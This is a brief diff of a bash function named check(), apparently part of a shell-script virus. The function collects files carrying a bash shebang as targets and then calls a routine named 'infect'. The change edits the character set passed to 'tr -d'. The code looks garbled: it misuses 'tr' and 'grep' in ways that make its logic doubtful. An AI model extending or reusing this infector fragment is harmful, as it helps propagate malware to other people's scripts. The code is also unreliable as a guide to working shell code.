@@ -53,7 +53,7 @@ function check() {
        local LISTNOTREADY=$(echo "$IFBASH" | tr -d ':#!/bin/bash')
        local LISTNOTREADYD=$(echo "$LISTNOTREADY" | sed -e 's/ /\ ,/g')
        local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
-       local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | tr -d ':lol')
+       local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | tr -d ':#arrow')
        LIST=$(echo "$LISTNOTREADY2D" | sed -e 's/ /\ ,/g')
 
        infect
